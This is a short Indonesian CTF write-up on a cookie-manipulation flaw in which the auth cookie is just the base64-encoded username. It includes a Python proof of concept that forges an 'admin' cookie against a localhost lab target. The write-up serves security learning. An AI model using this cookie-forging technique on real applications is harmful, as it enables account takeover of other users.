---
title: Akun Admin
description: Akun Admin
tags:
  - access control
  - account takeover
  - CTF
draft: false
---

## Summary
* Vuln Name: Cookies Manipulation
* Type: Broken access control
* Impact: Account Takeover
* Severity: High
* functionality: [[cookies]]

## Metodologi dan Observasi
1. register dan login sebagai akun biasa (test:test)
2. Periksa cookies yang diberikan: `auth=dGVzdA%3D%3D`
3. Url decoding menjadi `dGVzdA==`
4. Base64 decoding jadi `test`
5. Kesimpulan: aplikasi menyimpan username sebagai plaintext dalam base64.

## PoC
```
import requests
from urllib.parse import quote
import base64

url = 'http://localhost:1337/admin'
target = 'admin'

b64_cookies = base64.b64encode(target.encode('utf8')).decode('utf8')
encode_cookies = quote(b64_cookies)
headers = {'Cookie': f'auth={encode_cookies}'}
res = requests.get(url=url, headers=headers)
print(res.text)
```

## Impact
Seseorang dapat melakukan [[account takeover]] hanya dengan mengubah nilai `auth` pada cookies.